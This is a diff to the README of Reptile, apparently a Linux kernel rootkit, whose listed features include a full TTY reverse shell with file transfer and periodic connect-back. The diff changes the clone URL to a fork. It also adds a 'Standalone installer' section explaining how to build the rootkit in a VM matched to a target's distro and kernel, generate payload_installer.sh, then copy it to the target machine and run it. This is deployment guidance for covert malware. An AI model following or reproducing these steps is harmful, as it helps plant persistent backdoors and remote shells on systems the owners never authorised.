@@ -36,16 +36,35 @@ solely to disguise traffic.
 - Full TTY/PTY shell with file transfer
 - Client to handle Reptile Shell
 - Shell connect back each X times (not default)
+- Standalone installer (avoids compiling on target machine)
    
 ## Install
 ```
 apt install build-essential libncurses-dev linux-headers-$(uname -r)
-git clone https://github.com/f0rb1dd3n/Reptile.git
+git clone https://github.com/AnthraX1/Reptile.git
 cd Reptile
 make menuconfig           # or 'make config' or even 'make defconfig'
 make
 make install
 ```
+
+## Standalone installer
+
+Get a VM environment as close to target as possible, ie, same distro and version, same/very close kernel versions
+```
+apt install build-essential libncurses-dev linux-headers-$(uname -r)
+git clone https://github.com/AnthraX1/Reptile.git
+cd Reptile
+make menuconfig           # or 'make config' or even 'make defconfig'
+make
+make gen_installer
+```
+Copy payload_installer.sh to the target machine.
+```
+chmod +x payload_installer.sh
+./payload_installer.sh
+```
+
 More details about the installation see [Wiki](https://github.com/f0rb1dd3n/Reptile/wiki/Install)
 ## Uninstall
 
